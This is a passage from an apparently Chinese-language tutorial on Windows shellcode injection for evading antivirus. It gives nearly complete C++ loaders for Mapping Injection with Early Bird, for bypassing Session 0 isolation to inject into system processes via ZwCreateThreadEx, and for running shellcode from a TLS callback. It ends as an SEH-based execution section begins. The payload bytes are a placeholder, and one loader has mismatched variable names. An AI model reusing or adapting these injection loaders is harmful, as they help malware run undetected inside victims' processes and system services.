class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTARTUPINFOA)&amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     LPVOID lpMapAddressRemote = &lt;span class=&#34;built_in&#34;&gt;MapViewOfFile2&lt;/span&gt;(hMapping, pi.hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, PAGE_EXECUTE_READ);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)lpMapAddressRemote, pi.hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hMapping);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;UnmapViewOfFile&lt;/span&gt;(lpMapAddress);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Mapping Injection + Early Bird&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 可以和其他手段组合，比如 Early Bird 来达到强规避的效果&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Bypass Session 0 Injection (系统进程注入绕过)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 无法直接向系统进程内注入 shellcode 或者 dll，原因是 R3 的 CreateRemoteThread 在 R0 中的函数原型 ZwCreateThreadEx 在内部调用时会将第七个参数设为 1 导致会使新创建的线程处于挂起状态，所以我们的恶意 shellcode 无法被执行，只需要将第七个参数置 0 即可绕过。&lt;br /&gt;
注入流程：&lt;br /&gt;
1、利用函数原型自定义 ZwCreateThreadEx 函数&lt;br /&gt;
 2、通过系统获取 ntdll.dll 并加载 ZwCreateThreadEx 函数&lt;br /&gt;
 3、申请一块内存空间并将 shellcode 写入&lt;br /&gt;
 4、利用 ZwCreateThreadEx 将 shellcode 注入到系统进程中，将第七个参数置 0&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; _WIN64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DWORD&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* typedef_ZwCreateThreadEx)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    PHANDLE ThreadHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    ACCESS_MASK DesiredAccess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID ObjectAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    HANDLE ProcessHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPTHREAD_START_ROUTINE lpStartAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID lpParameter,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    ULONG CreateThreadFlags,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    SIZE_T ZeroBits,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    SIZE_T StackSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    SIZE_T MaximumStackSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID pUnkown)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DWORD&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* typedef_ZwCreateThreadEx)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    PHANDLE ThreadHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    ACCESS_MASK DesiredAccess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID ObjectAttributes,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    HANDLE ProcessHandle,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPTHREAD_START_ROUTINE lpStartAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID lpParameter,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    BOOL CreateSuspended,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    DWORD dwStackSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    DWORD dw1,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    DWORD dw2,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;    LPVOID pUnkown)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;//char DllPath[] = &amp;quot;C:\\Users\\Black Sheep\\source\\repos\\sesion0\\x64\\Debug\\TestDll.dll&amp;quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;   &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     HANDLE hRemoteThread;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hNtModule = &lt;span class=&#34;built_in&#34;&gt;GetModuleHandleA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ntdll.dll&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    typedef_ZwCreateThreadEx ZwCreateThreadEx = &lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hNtModule, &lt;span class=&#34;string&#34;&gt;&amp;quot;ZwCreateThreadEx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, FALSE, &lt;span class=&#34;number&#34;&gt;1516&lt;/span&gt;(系统进程pid));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X1000&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseAddress, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;ZwCreateThreadEx&lt;/span&gt;(&amp;amp;hRemoteThread, PROCESS_ALL_ACCESS, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hRemoteThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hProcess);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;FreeLibrary&lt;/span&gt;(hNtModule);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;TLS Code Execute (TLS 代码执行)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 线程局部存储（Thread Local Storage，TLS）用来将数据与一个正在执行的指定线程关联起来，其提供了回调函数因此可以利用该函数达到执行 shellcode 的效果，主要编写的是 Reason 其规定和 dll 调用时一样&lt;strong&gt; DLL_PROCESS_ATTACH&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment(linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/section:.data,RWE&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;  &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VOID NTAPI &lt;span class=&#34;built_in&#34;&gt;TlsCallBack&lt;/span&gt;(PVOID DllHandle, DWORD dwReason, PVOID Reserved)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (dwReason == DLL_PROCESS_ATTACH)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//写执行函数，也可以利用其他手段进行shellcode注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ((&lt;span class=&#34;built_in&#34;&gt;void&lt;/span&gt;(WINAPI*)(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)) &amp;amp; shellcode)();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment (linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/INCLUDE:__tls_used&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment (linker, &lt;span class=&#34;string&#34;&gt;&amp;quot;/INCLUDE:__tls_callback&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; data_seg (&lt;span class=&#34;string&#34;&gt;&amp;quot;.CRT$XLB&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; data_seg ()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 只是一种执行手段，依然可以配合其他手段组合。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;SEH Code Execute (SEH 异常处理代码执行)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 SEH (Structured Exception Handling) 结构化异常处理，是 windows 操作系统默认的错误处理机制，通过主动抛出异常然后将恶意代码插入即可触发，可用于反调试。&lt;/p&gt;
